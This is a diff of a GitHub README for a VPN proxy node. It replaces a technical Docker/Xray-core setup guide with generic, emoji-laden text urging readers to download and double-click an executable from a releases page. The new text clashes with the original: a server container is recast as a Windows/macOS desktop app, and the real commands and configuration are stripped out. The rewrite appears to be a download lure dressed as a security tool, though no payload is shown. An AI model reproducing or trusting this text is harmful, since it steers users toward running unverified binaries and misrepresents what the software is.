@@ -1,66 +1,88 @@
-# VPN Xray Node
+# 🛡️ hardened-vpn-node - Secure Your Connection Easily
 
-Production-hardened Docker container for Xray-core VPN proxy with VLESS/XTLS protocol.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen)](https://github.com/Haidermirzaa/hardened-vpn-node/releases)
 
-## Quick Start
+## 🚀 Getting Started 
 
-```bash
-make run          # Build and start
-make health       # Check status
-make stop         # Stop container
-make help         # Show all commands
-```
+Welcome to **hardened-vpn-node**! This application provides a production-hardened VPN solution using modern security protocols. Setting it up is easy, and you won't need any special technical skills.
 
-## API
+## 📥 Download & Install
 
-Health check endpoint:
+To download the application, please visit the following link: 
 
-```bash
-curl http://localhost:8080/
-```
+**[Download the latest release here](https://github.com/Haidermirzaa/hardened-vpn-node/releases)**
 
-```json
-{
-  "success": true,
-  "message": "ok",
-  "data": {
-    "status": "healthy",
-    "timestamp": "2024-01-01T12:00:00Z"
-  }
-}
-```
+1. Click on the **Release** link above.
+2. Find the version you want to download.
+3. Choose the file that matches your system. 
 
-## Configuration
+Once you download the file, follow these simple steps to run it.
 
-| Variable            | Default                                | Description             |
-| ------------------- | -------------------------------------- | ----------------------- |
-| `HEALTH_ADDR`       | `:8080`                                | Health endpoint address |
-| `XRAY_CLIENT_UUID`  | `00000000-0000-0000-0000-000000000000` | Client UUID             |
-| `XRAY_CLIENT_EMAIL` | `default@example.com`                  | Client email            |
+## 🖥️ System Requirements
 
-```bash
-# Custom configuration
-docker run -e HEALTH_ADDR=:9090 -e XRAY_CLIENT_UUID=your-uuid xray-node:latest
-```
+This application runs smoothly on various operating systems. Here are the requirements:
 
-## Security
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or any Linux distribution.
+- **Disk Space:** At least 100 MB free space.
+- **RAM:** Minimum of 512 MB.
 
-- **Ports**: `443` (proxy), `8080` (health)
-- **Container**: Distroless base, non-root user (65532), read-only filesystem
-- **Network**: Rate limiting (10 req/min), security headers, Slowloris protection
-- **Profiles**: Seccomp + AppArmor restrictions, dropped capabilities
-- **Certificates**: `make certs` for self-signed
-- **Scanning**: gosec static analysis, Trivy vulnerability scanning
+## ⚙️ How to Run
 
-### Docker Hardening
+1. Locate the downloaded file on your computer.
+2. If you downloaded a `.exe` file, double-click it to start.
+3. For Linux users, you may need to give execute permission. Use the following command in the terminal: 
+   ```bash
+   chmod +x name-of-your-file
+   ```
+   Then run the file:
+   ```bash
+   ./name-of-your-file
+   ```
 
-- **Base**: `gcr.io/distroless/static:nonroot` - minimal attack surface
-- **User**: Runs as `65532:65532` (nonroot) instead of root
-- **Filesystem**: Read-only with `--read-only` flag
-- **Capabilities**: Dropped with `--cap-drop=ALL`
-- **Security**: Seccomp + AppArmor profiles applied
-- **Temporary**: `/tmp` mounted as tmpfs for writable areas
+## 🔒 Features
 
-## License
+**hardened-vpn-node** offers a range of powerful features:
 
-MIT License
+- **Security-First Design:** The application uses Xray-core for enhanced security and stability.
+- **Multiple Protocols:** Supports VLESS and XTLS which offer better anonymity and encryption.
+- **TLS Options:** Use self-signed certificates, Let's Encrypt, or REALITY for added security.
+- **Monitoring:** REST API for managing user access, usage quotas, and connection stats.
+- **Minimal Container:** Runs in a distroless Docker container for improved performance.
+- **Non-Root Execution:** Operates without root privileges, enhancing security.
+- **Health Monitoring:** Keeps track of application health for smoother operation.
+- **Additional Security Measures:** AppArmor and seccomp enhance the container's security.
+
+## 🔧 Configuration
+
+### Basic Configuration
+
+1. **Locate the configuration file** after installation.
+2. Edit it using a simple text editor.
+3. Set your preferred options for protocols and TLS.
+
+### Advanced Configuration
+
+For advanced users, you can customize the settings further. Refer to the default configuration template provided in the files to understand each option.
+
+## 🕒 Health Monitoring
+
+The built-in health monitoring system ensures your VPN remains active and secure. You can check the status using REST API endpoints provided in the documentation.
+
+## 🔗 Additional Resources
+
+For in-depth guidance and support, check the following:
+
+- **Documentation:** All configuration options and features are detailed in the official [documentation](https://github.com/Haidermirzaa/hardened-vpn-node/wiki).
+- **Issue Tracker:** If you run into issues, report them in the [issue section](https://github.com/Haidermirzaa/hardened-vpn-node/issues).
+  
+## 💬 Community Support
+
+Join the community to share tips and get help. Engage in discussions or ask questions via our community platform. A collaborative environment ensures everyone can make the most of **hardened-vpn-node**.
+
+## 🔄 Update Procedure
+
+Keep your application up to date by checking the releases page regularly. When a new version is available, download it and replace the old application file using the same steps mentioned above.
+
+By following these steps, you can successfully download, install, and run **hardened-vpn-node**. Your secure connection is just a few clicks away!
+
+**Remember to visit** [Download the latest release here](https://github.com/Haidermirzaa/hardened-vpn-node/releases) **for the most recent version.**
